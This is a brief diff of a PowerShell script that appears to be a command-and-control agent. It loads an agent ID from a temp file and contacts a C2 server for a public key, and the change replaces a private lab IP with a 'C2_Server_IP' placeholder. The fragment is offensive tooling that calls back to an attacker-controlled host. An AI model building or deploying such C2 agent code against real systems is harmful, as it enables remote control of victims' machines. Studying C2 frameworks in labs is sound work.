@@ -113,7 +113,7 @@ Function Import-RSAKey {
 Try {
     $AgentIDFilePath = "C:\Temp\agent_id.txt"
     $AgentID = Load-AgentID -FilePath $AgentIDFilePath
-    $C2Url = "http://10.0.2.4:8000"
+    $C2Url = "http://C2_Server_IP:8000"
 
     Write-Host "[*] Fetching Public Key..."
     $PublicKeyResponse = Invoke-RestMethod -Uri "$C2Url/public_key" -Method GET
